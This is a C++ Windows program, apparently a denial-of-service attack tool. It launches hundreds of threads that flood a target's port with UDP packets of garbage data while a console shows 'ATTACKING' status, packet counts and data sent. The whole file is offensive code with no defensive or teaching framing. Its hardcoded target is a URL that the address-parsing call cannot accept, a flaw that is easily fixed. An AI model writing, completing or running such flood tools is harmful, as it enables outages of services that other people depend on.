#include <iostream>
#include <cstdlib>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include <thread>
#include <vector>
#include <atomic>
#include <Windows.h>
#include <chrono>
#include <iomanip>

std::atomic<bool> keepAttacking(true);
std::atomic<long long> totalPacketsSent(0);
std::atomic<long long> totalBytesSent(0);

BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        keepAttacking = false;
        return TRUE;
    }
    return FALSE;
}

void updateConsole(const std::string& targetIP, int port, int threads) {
    auto startTime = std::chrono::steady_clock::now();

    while (keepAttacking) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();

        system("cls");

        std::cout << R"(
??????????????????????????????????????????????
??????????????????????????????????????????????
??????????????????????????????????????????????
??????????????????????????????????????????????
)" << '\n';

        std::cout << "\n Target: " << targetIP << ":" << port << "\n";
        std::cout << " Threads: " << threads << "\n";
        std::cout << " Duration: " << elapsed << " seconds\n";
        std::cout << " Packets sent: " << totalPacketsSent << "\n";
        std::cout << " Data sent: " << std::setprecision(2) << std::fixed
            << totalBytesSent / (1024.0 * 1024.0) << " MB\n";
        std::cout << " Status: [";

        static int anim = 0;
        const char* animChars = "|/-\\";
        for (int i = 0; i < 10; i++) {
            std::cout << (i == anim % 10 ? animChars[anim % 4] : ' ');
        }
        anim++;

        std::cout << "] ATTACKING\n";
        std::cout << "\n Press CTRL+C to stop...\n";

        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

void sendMaliciousPackets(const char* targetIP, int port, int packetSize) {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;

    sockaddr_in victimAddr;
    victimAddr.sin_family = AF_INET;
    victimAddr.sin_port = htons(port);
    inet_pton(AF_INET, targetIP, &victimAddr.sin_addr);

    char* garbageData = new char[packetSize];
    memset(garbageData, rand() % 256, packetSize);

    while (keepAttacking) {
        if (sendto(sock, garbageData, packetSize, 0,
            (struct sockaddr*)&victimAddr, sizeof(victimAddr)) != SOCKET_ERROR) {
            totalPacketsSent++;
            totalBytesSent += packetSize;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }

    closesocket(sock);
    delete[] garbageData;
}

void massThreadDDoS(const char* targetIP, int port, int threads, int packetSize) {
    std::vector<std::thread> attackThreads;
    std::thread consoleThread(updateConsole, std::string(targetIP), port, threads);

    for (int i = 0; i < threads; ++i) {
        attackThreads.emplace_back(sendMaliciousPackets, targetIP, port, packetSize);
    }

    for (auto& thread : attackThreads) {
        thread.join();
    }

    consoleThread.join();

    system("cls");
    std::cout << "\n Attack stopped!\n";
    std::cout << " Total packets sent: " << totalPacketsSent << "\n";
    std::cout << " Total data sent: " << std::setprecision(2) << std::fixed
        << totalBytesSent / (1024.0 * 1024.0) << " MB\n";
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        return 1;
    }
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        std::cerr << "Failed to set control handler!" << std::endl;
        WSACleanup();
        return 1;
    }

    const char* targetIP = "https://ddos-test.com/";
    int port = 80;
    int threads = 500;
    int packetSize = 1024;

    massThreadDDoS(targetIP, port, threads, packetSize);

    WSACleanup();
    return 0;
}
